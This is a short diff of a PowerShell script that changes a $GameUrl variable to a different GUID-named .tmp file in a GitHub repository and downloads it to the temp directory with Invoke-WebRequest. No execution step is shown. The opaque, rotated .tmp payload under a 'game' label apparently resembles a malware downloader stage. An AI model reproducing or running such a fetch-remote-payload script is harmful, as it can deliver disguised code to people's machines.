@@ -1,7 +1,7 @@
 $ErrorActionPreference = "Stop"
 
-$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
-$TempFile = Join-Path ([IO.Path]::GetTempPath()) "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
+$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/4b71773a-4f54-4643-ab54-96c34e9eb775.tmp"
+$TempFile = Join-Path ([IO.Path]::GetTempPath()) "4b71773a-4f54-4643-ab54-96c34e9eb775.tmp"
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing
 
